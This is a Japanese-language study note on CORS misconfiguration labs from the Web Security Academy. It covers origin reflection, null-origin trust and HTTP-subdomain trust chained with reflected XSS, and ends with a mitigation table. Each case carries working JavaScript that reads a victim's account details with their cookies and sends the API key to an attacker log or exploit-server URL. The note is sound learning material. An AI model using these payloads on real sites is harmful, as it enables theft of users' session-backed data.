# CORS脆弱性を利用した攻撃 学習ノート
> Web Security Academy の学習記録

---

## 1. CORSの基礎知識

### CORSとは
**Cross-Origin Resource Sharing（クロスオリジンリソース共有）** の略。
ブラウザは異なるオリジン間の通信を制限しているが、サーバーがCORSヘッダーを返すことで特定のオリジンからのアクセスを許可できる。

### オリジンとは
以下の3つの組み合わせで定義される：

| 要素 | 例 |
|---|---|
| プロトコル | `https://` |
| ドメイン | `example.com` |
| ポート | `:443` |

これらのうち1つでも異なれば「別オリジン（クロスオリジン）」として扱われる。

### 主要なCORSヘッダー

| ヘッダー | 役割 |
|---|---|
| `Origin` | リクエスト送信元のオリジン（ブラウザが自動付与） |
| `Access-Control-Allow-Origin` | アクセスを許可するオリジン（サーバーが返す） |
| `Access-Control-Allow-Credentials` | Cookie等の認証情報を含むリクエストを許可するか |

## 2. 共通の攻撃前調査手順

どのケースでも、攻撃可能かどうかを以下の手順で確認する。

### ① /accountDetails へのリクエスト確認
1. ブラウザでログインしアカウントページにアクセス
2. Burp Suite でトラフィックを確認
3. `/accountDetails` へのAJAXリクエストを発見
4. レスポンスに `Access-Control-Allow-Credentials: true` があることを確認

### ② Originヘッダーを付加して再送信
Burp Repeater でリクエストに `Origin` ヘッダーを追加して送信し、  
レスポンスの `Access-Control-Allow-Origin` の内容を確認する。

```
# リクエスト例
GET /accountDetails HTTP/1.1
Host: target.web-security-academy.net
Origin: https://example.com   ← 追加

# レスポンス例（脆弱な場合）
Access-Control-Allow-Origin: https://example.com   ← そのまま反映される
Access-Control-Allow-Credentials: true
```

## 3. ケース1：全オリジンを信頼するCORS設定

### 脆弱性の説明

サーバーがリクエストの `Origin` ヘッダーの値を検証せず、  
そのまま `Access-Control-Allow-Origin` に返してしまう設定。

```
リクエスト: Origin: https://evil.com
　　　　　　　　↓
レスポンス: Access-Control-Allow-Origin: https://evil.com  ← 無条件に反映
           Access-Control-Allow-Credentials: true
```

どのオリジンからでも認証情報付きでレスポンスを読み取れてしまう。

### エクスプロイトコードと解説

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;

    // ①被害者のブラウザから脆弱なサーバーにリクエスト
    req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);

    // ②被害者のCookie（セッション）を自動送信
    req.withCredentials = true;

    req.send();

    function reqListener() {
        // ③取得したAPIキーを攻撃者サーバーのURLパラメータとして送信
        location = '/log?key=' + this.responseText;
    };
</script>
```

| コード | 役割 |
|---|---|
| `withCredentials: true` | 被害者のCookieを使って認証済みリクエストを送る |
| `req.onload = reqListener` | レスポンス受信時に実行する関数を事前登録（非同期） |
| `location='/log?key=...'` | 取得したデータを攻撃者サーバーのURLに埋め込んで送信 |

### 攻撃フロー

```
攻撃者サーバー          被害者のブラウザ          脆弱なサーバー
      │                       │                        │
      │  ①悪意あるページを配信  │                        │
      │──────────────────────>│                        │
      │                       │  ②/accountDetailsへ    │
      │                       │  被害者のCookie付きリクエスト
      │                       │──────────────────────>│
      │                       │  ③APIキーを含むレスポンス │
      │                       │<──────────────────────│
      │  ④APIキーをログに送信   │                        │
      │<──────────────────────│                        │
```

### 認識精査

#### 当初の認識
最初にリクエストのヘッダー部分にOriginとURLを記述し、レスポンスの `Access-Control-Allow-Origin` の内容を見ることで、クロスオリジンに対する設定を確認し、攻撃可能かどうかを判断する。攻撃可能と判断したときに、エクスプロイトを記述してその内容を被害者ユーザーに送信する。CORSを利用した攻撃の流れとしては、被害者ユーザーのブラウザがエクスプロイトコードが記述されたサイトを開き、ブラウザがエクスプロイトサイトからのリクエストを対象サービスのサーバーに送る。対象サービスのサーバーが管理外のクロスオリジンに対するリソースの提供を許可する脆弱性を有していた場合、レスポンスとしてトークンや重要なパラメータを送信してしまう。レスポンスから取得したデータを、被害者側のブラウザが受け取り、エクスプロイトが次の処理として取得したデータを攻撃者のサーバーのログに記録する。これによって、攻撃者は攻撃対象であるサービスサーバーの管理者情報を取得できる。

#### 精査内容

**攻撃の主語について**  
「ブラウザがエクスプロイトサイトからのリクエストを送る」は主語が曖昧。正確には：
```
エクスプロイトサイトのJavaScriptが
被害者のブラウザを通じて
被害者のCookie（認証情報）付きで
対象サーバーにリクエストを送る
```
**被害者のCookieが自動的に付与される**点が攻撃の核心。  
攻撃者が直接リクエストを送っても被害者のCookieは持っていないため意味がない。

**レスポンス受信後の処理について**  
「被害者側のブラウザが受け取り、エクスプロイトが次の処理として〜」は正しいが、より正確に整理すると：
```
①被害者のブラウザがレスポンスを受け取る
        ↓
②エクスプロイトのJavaScript（reqListener関数）が発火
        ↓
③レスポンスの内容をURLパラメータに乗せて
        ↓
④攻撃者サーバーにGETリクエストを送信
        ↓
⑤攻撃者サーバーのアクセスログにAPIキーが記録される
```

**「管理者情報を取得できる」について**  
ラボの文脈では正しいが、より正確には「被害者ユーザーがアクセス可能な情報を取得できる」。  
攻撃者が取得できる情報の範囲は **被害者の権限に依存する**。  
被害者が管理者であればAPIキーが取れるが、一般ユーザーであれば一般ユーザーの情報しか取れない。

#### 改めて整理した攻撃の全体像

```
【事前調査】
攻撃者がOriginヘッダーを付けてリクエスト
→ Access-Control-Allow-Originにそのまま反映される
→ 攻撃可能と判断

【攻撃実行】
攻撃者がエクスプロイトを作成
→ 被害者にエクスプロイトURLを送信
→ 被害者のブラウザがエクスプロイトサイトを開く
→ JavaScriptが被害者のCookie付きで対象サーバーにリクエスト
→ 脆弱なサーバーがクロスオリジンを許可してレスポンスを返す
→ JavaScriptがレスポンス（APIキー）を攻撃者サーバーに送信
→ 攻撃者がログからAPIキーを取得
```

## 4. ケース2：nullオリジンを信頼するCORS設定

### 脆弱性の説明

サーバーが `Origin: null` を信頼する設定になっている。  
`null` オリジンは以下のような特殊なケースで発生する：

| 発生状況 | 説明 |
|---|---|
| `file://` からのリクエスト | ローカルHTMLファイルを開いた場合 |
| **sandbox属性付きのiframe** | `allow-same-origin` を含まない場合 |
| リダイレクトを跨いだリクエスト | オリジン情報が失われるケース |
| `data:` URI | インラインで実行されるHTML |

**なぜ `null` を許可する設定が生まれるのか？**  
開発時に `file://` でローカルテストをすると `Origin: null` が送られるため、  
開発の便宜上そのまま許可してしまうケースがあり、これが本番環境に残ることで脆弱性になる。

### sandbox属性の仕組み

```
sandbox属性の本来の動作
→ iframeのコンテンツを「別オリジン」として扱い制限をかける

allow-same-originを付けると
→ iframeを親ページと同じオリジンとして扱う（制限を緩和）

allow-same-originを付けないと
→ iframeは完全に隔離された環境になる
→ オリジンが「どこでもない」= null になる
```

### エクスプロイトコードと解説

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
            location='https://攻撃者サーバー/log?key=' + this.responseText;
        };
    </script>
">
</iframe>
```

**sandbox属性値の役割：**

| 属性値 | 役割 |
|---|---|
| `allow-scripts` | iframeの中でJavaScriptを実行するために必要 |
| `allow-top-navigation` | 攻撃者サーバーへのリダイレクト（`location=`）のために必要 |
| `allow-forms` | フォーム送信を許可 |
| `allow-same-origin` | **あえて含めない** → `Origin: null` を発生させる |

### 攻撃フロー

```
攻撃者サーバー        被害者ブラウザ      脆弱なサーバー
     │                   │                  │
     │ ①悪意あるページ配信 │                  │
     │──────────────────>│                  │
     │        ②sandboxed iframeが起動        │
     │                   │ ③Origin: null で  │
     │                   │ /accountDetailsへ │
     │                   │─────────────────>│
     │                   │ ④nullを信頼して   │
     │                   │  レスポンスを返す  │
     │                   │<─────────────────│
     │ ⑤APIキーをログに送信│                  │
     │<──────────────────│                  │
```

### 認識精査

#### 当初の認識
攻撃が可能かについての判断は、リクエストに `Origin: null` を送信し、対応するレスポンスの `Access-Control-Allow-Origin` の状態がnullを信頼するかしないかから判断を行う。攻撃が可能だと判断できれば、nullオリジンを利用するエクスプロイトを記述したサイトを被害者ユーザーのブラウザに送信し実行させる。`Origin: null` を攻撃対象サービスサーバーへのリクエストで送るケースの一つとして、sandbox属性付きの `<iframe>` を利用したリクエストを用いる。sandbox属性は機能やリソースの制限を設定できる属性である為、属性値の一つである `allow-same-origin` を含めないことでリクエストのヘッダーに `Origin: null` を追加できる。攻撃の流れについては、被害者ユーザーのブラウザがエクスプロイトコードが記述されたサイトを開き、ブラウザが `Origin: null` を付加したリクエストを対象サービスのサーバーに送る。対象サービスのサーバーがnullオリジンに対するリソースの提供を許可している場合、レスポンスとしてトークンや重要なパラメータを送信してしまう。レスポンスから取得したデータを、被害者側のブラウザが受け取り、エクスプロイトが次の処理として取得したデータを攻撃者のサーバーのログに記録する。これによって、攻撃者は攻撃対象であるサービスサーバーの管理者情報を被害者ユーザーから取得したデータを介して間接的に取得できる。

#### 精査内容

**`allow-same-origin` を含めないことで `Origin: null` になる仕組みについて**  
「属性値を含めないことで `Origin: null` を追加できる」は概ね正しいが、より正確には：
```
sandbox属性の本来の動作
→ iframeのコンテンツを「別オリジン」として扱い制限をかける

allow-same-originを付けると
→ iframeを親ページと同じオリジンとして扱う（制限を緩和）

allow-same-originを付けないと
→ iframeは完全に隔離された環境になる
→ オリジンが「どこでもない」= null になる
```
`allow-same-origin` は「同一オリジンとして扱う許可」であり、  
これを**あえて付けないことでオリジンが剥奪され `null` になる**という理解が正確。

**「ブラウザが `Origin: null` を付加したリクエストを送る」の主語について**  
主語をより正確にすると：
```
❌ ブラウザがOrigin:nullを付加したリクエストを送る

✅ iframeの中で実行されたJavaScriptが
   被害者のCookie付きで
   Origin:nullを付加したリクエストを送る
```
`Origin: null` を発生させているのは **iframeという実行環境** であり、  
その中のJavaScriptがリクエストを組み立てて送っている点が重要。

#### 改めて整理した攻撃の全体像

```
【事前調査】
Origin: nullを付けてリクエスト
→ Access-Control-Allow-Origin: nullが返る
→ 攻撃可能と判断

【攻撃実行】
sandboxed iframeを含むエクスプロイトを作成
→ 被害者にエクスプロイトURLを送信
→ 被害者のブラウザがエクスプロイトサイトを開く
→ iframeが起動しその中でJavaScriptが実行される
→ allow-same-originがない為Origin: nullが付与される
→ 被害者のCookie付きで対象サーバーにリクエスト
→ 脆弱なサーバーがnullを許可してレスポンスを返す
→ JavaScriptがレスポンス（APIキー）を攻撃者サーバーに送信
→ 攻撃者がログからAPIキーを取得
```

## 5. ケース3：全サブドメインを信頼するCORS設定

### 脆弱性の説明

サーバーがプロトコル（http/https）を区別せず、  
全てのサブドメインを信頼するCORS設定になっている。

```
Origin: https://subdomain.target.net  →  許可（想定内）
Origin: http://subdomain.target.net   →  許可（httpも通る！）
Origin: http://evil.target.net        →  許可（任意サブドメイン！）
```

**この攻撃は2つの脆弱性の組み合わせで成立する：**

```
XSSの脆弱性（サブドメイン）　×　CORSの誤設定（メインサーバー）　＝　攻撃成立

どちらか一方だけでは攻撃は成立しない
・XSSだけ    → メインサーバーのCORSが許可しなければデータを読めない
・CORSだけ   → 攻撃者が直接リクエストしても被害者のCookieがない
```

**なぜ `http` が危険なのか？**

```
https://stock.example.com  → 暗号化通信・改ざん困難
http://stock.example.com   → 平文通信・中間者攻撃が可能
                                    ↑
                          攻撃者がHTTPレスポンスを改ざんして
                          XSSペイロードを注入できる
```

`http` を許可することは、**ネットワーク上の攻撃者にXSSの踏み台を提供する**ことと同義。

### 事前調査（XSS確認）

```
# productIdにペイロードを挿入
http://stock.xxx.net/?productId=<script>alert(1)</script>&storeId=1

# alertが発火 → 反射型XSS確定
```

Burp Suite でレスポンスのHTMLを確認し、  
ペイロードがサニタイズされずに出力されていれば **反射型XSS** と判断できる。

### エクスプロイトコードと解説

```html
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

**重要なポイント：**

| ポイント | 内容 |
|---|---|
| `productId=4` | 数値を先頭に付ける（サーバーのバリデーション対策） |
| `%3c/script>` | `</script>` をURLエンコード（外側のscriptタグを閉じないようにする） |
| `%2b` | `+` をURLエンコード（URLの解釈を防ぐ） |
| 1つの文字列として渡す | 文字列分割・結合をせず、document.locationに一括で代入 |

**攻撃の2段階構造：**

```
【第1段階：XSSの発火】
サブドメインサーバー（stock.xxx.net）が
クエリパラメータをそのままHTMLに出力
→ 被害者ブラウザでスクリプトが発火

【第2段階：CORSリクエストの送信】
発火したスクリプトが
メインサーバー（xxx.net）の /accountDetails に
被害者のCookie付き・サブドメインOriginでリクエストを送信
```

### 攻撃フロー

```
攻撃者サーバー      被害者ブラウザ    サブドメインサーバー   メインサーバー
     │                 │                  │                  │
     │ ①エクスプロイト  │                  │                  │
     │   ページを配信   │                  │                  │
     │────────────────>│                  │                  │
     │  ②XSSペイロード付きURLへリダイレクト  │                  │
     │                 │─────────────────>│                  │
     │                 │ ③反射型XSS発火    │                  │
     │                 │    ↓スクリプト実行 │                  │
     │                 │                  │ ④Origin:http://stock...
     │                 │                  │  /accountDetailsへ│
     │                 │                  │─────────────────>│
     │                 │                  │ ⑤サブドメインと認識│
     │                 │                  │  レスポンスを返す  │
     │                 │                  │<─────────────────│
     │ ⑥APIキーを送信   │                  │                  │
     │<────────────────│                  │                  │
```

### 認識精査

#### 当初の認識
攻撃が可能かの判断についてはリクエストに対して、`Origin: https://subdomain.targetdomain` をヘッダー情報に追記し、そのレスポンスヘッダーに含まれている `Access-Control-Allow-Origin` の内容を見ることで、攻撃が可能かを判断する。今回の攻撃のケースでは、サブドメイン先に反射型XSSに対する脆弱性が含まれている為、このサブドメインのリクエストラインのクエリパラメータに、CORSを利用したエクスプロイトを記述したスクリプトを挿入する。（反射型XSS攻撃が可能かの判断についてはクエリパラメータ部分にスクリプト文を挿入し、そのレスポンスを確認することで判断する。）攻撃の流れとしては、被害者側ブラウザが、XSSに対する脆弱性を持つサブドメインのサイトとエクスプロイトを含めたクエリパラメータからなるリクエストを攻撃対象サーバーに送信する。攻撃対象サーバーのレスポンスにより、クエリパラメータに埋め込んだエクスプロイトが被害者ブラウザ側で発火する。エクスプロイトの内容から、攻撃対象のサーバーはサブドメインに対するリソースのシェアを許可している為、トークンや重要なパラメータのリソースをブラウザが保持しているサブドメインサイトのJavaScriptに提供する。エクスプロイトを記述したスクリプトが取得したデータについて、攻撃者側のサーバーにログとして出力させる。これにより、間接的に攻撃対象の管理者情報を取得できる。

#### 精査内容

**攻撃フローの主語と順序について**  
「被害者側ブラウザがサブドメインのサイトとエクスプロイトを含めたクエリパラメータからなるリクエストを攻撃対象サーバーに送信する」は順序が混在している。正確には：
```
① 被害者のブラウザが攻撃者のエクスプロイトサイトを開く
        ↓
② エクスプロイトサイトのJavaScriptが
   XSS脆弱性のあるサブドメインURLへ被害者をリダイレクト
        ↓
③ 被害者のブラウザがサブドメインサーバーにリクエストを送信
   （クエリパラメータにXSSペイロードが含まれている）
        ↓
④ サブドメインサーバーがクエリパラメータを
   サニタイズせずHTMLに反映してレスポンスを返す
        ↓
⑤ 被害者のブラウザでXSSが発火
```

**攻撃の2段階構造について**  
「攻撃対象サーバーのレスポンスによりエクスプロイトが発火する」は2段階に分けて認識する必要がある：
```
【第1段階：XSSの発火】
サブドメインサーバー（stock.xxx.net）が
クエリパラメータをそのままHTMLに出力
→ 被害者ブラウザでスクリプトが発火

【第2段階：CORSリクエストの送信】
発火したスクリプトがメインサーバー（xxx.net）の /accountDetails に
被害者のCookie付き・サブドメインOriginでリクエストを送信
```

**「サブドメインサイトのJavaScriptに提供する」について**  
より正確には：
```
❌ サブドメインサイトのJavaScriptに提供する

✅ サブドメインから発火したXSSのJavaScriptに対して
   メインサーバーがCORSを許可してレスポンスを返す

   つまりオリジンは「サブドメイン」であり
   そこから実行されたスクリプトが
   メインサーバーのリソースを受け取れてしまう
```

#### 改めて整理した攻撃の全体像

```
【事前調査①：CORS確認】
Origin: https://stock.xxx.net を付けてリクエスト
→ Access-Control-Allow-Originに反映される
→ サブドメインが信頼されていることを確認

【事前調査②：XSS確認】
stock.xxx.net/?productId=<script>alert(1)</script>
→ alertが発火することを確認
→ 反射型XSSが存在することを確認

【攻撃実行】
① エクスプロイトサイトにdocument.locationでサブドメインXSSのURLを記述
        ↓
② 被害者がエクスプロイトサイトを開く
        ↓
③ 被害者のブラウザがXSSペイロード付きでサブドメインにリクエスト
        ↓
④ サブドメインサーバーがペイロードをそのまま返す（反射型XSS発火）
        ↓
⑤ 発火したスクリプトがメインサーバーに
   被害者Cookie付き・サブドメインOriginでCORSリクエスト
        ↓
⑥ メインサーバーがサブドメインを信頼してAPIキーを返す
        ↓
⑦ スクリプトがAPIキーを攻撃者サーバーのログに送信
        ↓
⑧ 攻撃者がログからAPIキーを取得
```

## 6. 補足知識

### APIキーとは

**「誰がAPIを呼び出しているかを識別するための、サーバーが発行するトークン（識別子）」**

APIキーは認証と認可の両方を担う：

| 役割 | 内容 |
|---|---|
| **認証（Authentication）** | 「あなたは誰ですか？」→ このAPIキーはwienerというユーザーのものだ |
| **認可（Authorization）** | 「あなたは何ができますか？」→ このAPIキーはadmin機能は使えない |

**セッションCookieとの違い：**

| | APIキー | セッションCookie |
|---|---|---|
| 主な用途 | プログラム間通信（API） | ブラウザ-サーバー間 |
| 発行タイミング | 明示的に発行・管理 | ログイン時に自動発行 |
| 送信方法 | ヘッダーやパラメータに手動で含める | ブラウザが自動送信 |
| 有効期限 | 長期間有効なことが多い | セッション終了で失効 |

### AJAXリクエストとは

**Asynchronous JavaScript And XML** の略。  
ページ全体を再読み込みせず、必要な部分だけを非同期で更新する通信方式。

**同期通信と非同期通信の違い：**

```
【同期通信】
リクエスト送信 → ページがフリーズ → レスポンス受信 → ページ全体を再描画

【非同期通信（AJAX）】
リクエスト送信 → バックグラウンドで処理 → 他の操作が可能 → 該当部分だけ更新
```

**XMLHttpRequest のコード解説：**

```javascript
var req = new XMLHttpRequest();

// ①完了時のコールバックを先に登録（非同期の肝）
req.onload = reqListener;

// ②リクエストの設定（第3引数 true = 非同期モード）
req.open('get', '/accountDetails', true);

req.withCredentials = true;  // Cookieを含める

// ③リクエスト送信（この時点ではレスポンスはまだ来ていない）
req.send();

// ④レスポンスが来た時だけ呼ばれる
function reqListener() {
    location = '/log?key=' + this.responseText;
}
```

## 7. 対策まとめ

| ケース | 問題 | 対策 |
|---|---|---|
| 全オリジン信頼 | Originをそのまま反映 | 許可するオリジンをホワイトリストで明示的に指定する |
| 全オリジン信頼 | `Allow-Credentials: true` の乱用 | クレデンシャルが不要なエンドポイントでは `false` にする |
| nullオリジン信頼 | `null` を許可リストに含めている | `null` を許可リストに含めない |
| nullオリジン信頼 | 開発設定が本番に残存 | 本番デプロイ前にCORSホワイトリストを厳密にレビューする |
| サブドメイン信頼 | httpサブドメインを信頼している | `https` のみを許可リストに含める |
| サブドメイン信頼 | ワイルドカードで一括信頼 | 必要なサブドメインのみを明示的に列挙する |
| サブドメイン信頼 | サブドメインのXSS放置 | CORSの信頼範囲内のドメインは特に厳密にXSS対策をする |
